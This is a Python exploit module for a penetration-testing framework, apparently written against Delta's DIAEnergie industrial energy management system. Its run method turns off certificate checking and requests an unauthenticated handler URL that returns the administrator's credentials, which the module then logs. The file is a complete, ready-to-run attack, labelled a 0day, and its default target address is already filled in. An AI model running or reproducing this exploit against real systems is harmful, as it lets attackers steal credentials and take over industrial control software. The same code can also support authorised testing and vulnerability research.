#!/usr/bin/env python

import urllib2
import ssl
import json
import pprint
from collections import OrderedDict
from Sploit import Sploit


INFO = {}
INFO['NAME'] = "efs_delta_DIAEnergie_info_disclosure"
INFO['DESCRIPTION'] = "	Industrial Energy Management System DIAEnergie Information Disclosure"
INFO['VENDOR'] = "http://www.deltaww.com"
INFO["CVE Name"] = "0day"
INFO["DOWNLOAD_LINK"] = "http://www.deltaww.com/services/DownloadCenter2.aspx?secID=8&pid=2&tid=0&CID=06&itemID=060702&typeID=1&downloadID=DIAEnergie,&title=DIAEnergie&dataType=8;&check=1&hl=en-US"
INFO["LINKS"] = []
INFO['CHANGELOG'] = "30 Aug, 2017"
INFO['PATH'] = "General/"
INFO["NOTES"] = """
    Vulnerability allows to show users credentials. Authentication is not required. 
Tested against DIAEnergie 1.5.90.91 on Windows 7 SP1 x64.
"""

# Must be in every module, to be set by framework
OPTIONS = OrderedDict()
OPTIONS["HOST"] = "192.168.1.176"
OPTIONS["PORT"] = 80
OPTIONS["SSL"] = False


class exploit(Sploit):
    def __init__(self,host="",
                port=0, ssl=False,
                logger=None):
        Sploit.__init__(self, logger=logger)
        self.name = INFO['NAME']

    def args(self):
        self.args = Sploit.args(self, OPTIONS)
        self.host = self.args.get("HOST", OPTIONS["HOST"])
        self.port = self.args.get("PORT", OPTIONS["PORT"])
        self.ssl = self.args.get("SSL", OPTIONS["SSL"])

    def make_url(self, path=''):
        proto = 'https' if self.ssl else 'http'
        url = '%s://%s:%s/%s' % (proto, self.host, self.port, path)
        return url

    def run(self):
        #Get options from gui
        self.args()
        url = self.make_url('')
        self.log('[*] Trying to connect to %s' % url)
        ctx = ssl.create_default_context()
        ctx.check_hostname = False
        ctx.verify_mode = ssl.CERT_NONE
        opener = urllib2.build_opener(urllib2.HTTPSHandler(context=ctx))
        try:
            opener.open(url)
        except Exception as e:
            self.log(e)
            self.finish(False)
        self.log('[*] Trying to get admin\'s creds')
        resp = opener.open(self.make_url('DataHandler/WebApis/DIAE_usHandler.ashx?ttype=GetObject&pUid=1')).read()
        resp = json.loads(resp)
        self.log('[+]\r\n' + pprint.pformat(resp))
        self.finish(True)


if __name__ == '__main__':
    """
    By now we only have the tool
    mode for exploit..
    Later we would have
    standalone mode also.
    """
    print "Running exploit %s .. " % INFO['NAME']
    e = exploit("192.168.0.1",80)
    e.run()